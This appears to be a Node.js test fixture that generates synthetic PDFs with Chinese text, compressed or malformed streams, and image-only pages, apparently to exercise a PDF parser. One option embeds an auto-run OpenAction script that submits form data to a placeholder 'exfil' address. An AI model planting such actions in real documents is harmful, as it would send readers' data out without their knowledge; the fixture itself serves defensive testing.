import { deflateSync, constants } from 'node:zlib';

// 与 Unit 中同源的仓库原创 ToUnicode PDF；所有内容与图像均在本机合成。
export function createPdf({ text = '合成制度 FN-PDF-042：三个工作日。', pages = 2, compressed = false,
  decodedBytes = 0, filter = 'FlateDecode', predictor = 1, indirectParameters = false,
  incomplete = false, imageOnly = false, actions = false } = {}) {
  const hex = Buffer.from(text, 'utf16le').swap16().toString('hex').toUpperCase();
  const characters = [...new Set(text.split(''))];
  const code = character => character.charCodeAt(0).toString(16).padStart(4, '0').toUpperCase();
  const cmap = `/CIDInit /ProcSet findresource begin\n12 dict begin\nbegincmap\n/CIDSystemInfo << /Registry (Adobe) /Ordering (UCS) /Supplement 0 >> def\n/CMapName /R05e2 def\n/CMapType 2 def\n1 begincodespacerange\n<0000> <FFFF>\nendcodespacerange\n`
    + (characters.length ? `${characters.length} beginbfchar\n${characters.map(c => `<${code(c)}> <${code(c)}>`).join('\n')}\nendbfchar\n` : '')
    + 'endcmap\nCMapName currentdict /CMap defineresource pop\nend\nend\n';
  const stream = (bytes, encode) => {
    if (!encode) return `<< /Length ${bytes.length} >>\nstream\n${bytes.toString('ascii')}endstream`;
    let compressedBytes = deflateSync(bytes, { level: 9, finishFlush: incomplete ? constants.Z_SYNC_FLUSH : constants.Z_FINISH });
    if (incomplete) {
      let first = 1, second = 0;
      for (const byte of bytes) { first = (first + byte) % 65521; second = (second + first) % 65521; }
      const checksum = Buffer.alloc(4);
      checksum.writeUInt32BE(((second << 16) | first) >>> 0);
      compressedBytes = Buffer.concat([compressedBytes, checksum]);
    }
    const encoded = compressedBytes.toString('hex').toUpperCase() + '>\n';
    const parameters = indirectParameters ? ` /DecodeParms [null ${7 + pages * 2} 0 R]`
      : predictor === 1 ? '' : ` /DecodeParms [null << /Predictor ${predictor} >>]`;
    return `<< /Length ${encoded.length} /Filter [/ASCIIHexDecode /${filter}]${parameters} >>\nstream\n${encoded}endstream`;
  };
  const objects = [
    `<< /Type /Catalog /Pages 2 0 R${actions ? ' /OpenAction << /S /JavaScript /JS (this.submitForm("https://198.51.100.1/exfil")) >>' : ''} >>`,
    `<< /Type /Pages /Count ${pages} /Kids [${Array.from({ length: pages }, (_, i) => `${7 + i * 2} 0 R`).join(' ')}] >>`,
    '<< /Type /Font /Subtype /Type0 /BaseFont /STSong-Light /Encoding /Identity-H /DescendantFonts [4 0 R] /ToUnicode 5 0 R >>',
    '<< /Type /Font /Subtype /CIDFontType0 /BaseFont /STSong-Light /CIDSystemInfo << /Registry (Adobe) /Ordering (GB1) /Supplement 4 >> /FontDescriptor 6 0 R /DW 1000 >>',
    stream(Buffer.from(cmap, 'ascii'), false),
    '<< /Type /FontDescriptor /FontName /STSong-Light /Flags 4 /FontBBox [0 -200 1000 1000] /ItalicAngle 0 /Ascent 880 /Descent -120 /CapHeight 880 /StemV 80 >>'
  ];
  for (let page = 0; page < pages; page++) {
    objects.push(`<< /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] /Resources << /Font << /F1 3 0 R >>${imageOnly ? ` /XObject << /Im1 ${7 + pages * 2} 0 R >>` : ''} >> /Contents ${8 + page * 2} 0 R >>`);
    const content = Buffer.from(imageOnly ? 'q 100 0 0 100 40 40 cm /Im1 Do Q\n' : `BT /F1 12 Tf 40 750 Td <${hex}> Tj ET\n`, 'ascii');
    const bytes = decodedBytes ? Buffer.alloc(decodedBytes, 32) : content;
    if (decodedBytes) content.copy(bytes);
    objects.push(stream(bytes, compressed));
  }
  if (imageOnly) objects.push('<< /Type /XObject /Subtype /Image /Width 1 /Height 1 /ColorSpace /DeviceGray /BitsPerComponent 8 /Length 3 /Filter /ASCIIHexDecode >>\nstream\n00>\nendstream');
  if (indirectParameters) objects.push(`<< /Predictor ${predictor} >>`);
  let document = '%PDF-1.7\n';
  const offsets = [0];
  objects.forEach((object, index) => { offsets.push(Buffer.byteLength(document, 'ascii')); document += `${index + 1} 0 obj\n${object}\nendobj\n`; });
  const xref = Buffer.byteLength(document, 'ascii');
  document += `xref\n0 ${objects.length + 1}\n0000000000 65535 f \n${offsets.slice(1).map(offset => `${offset.toString().padStart(10, '0')} 00000 n \n`).join('')}`;
  document += `trailer\n<< /Size ${objects.length + 1} /Root 1 0 R >>\nstartxref\n${xref}\n%%EOF\n`;
  return Buffer.from(document, 'ascii');
}
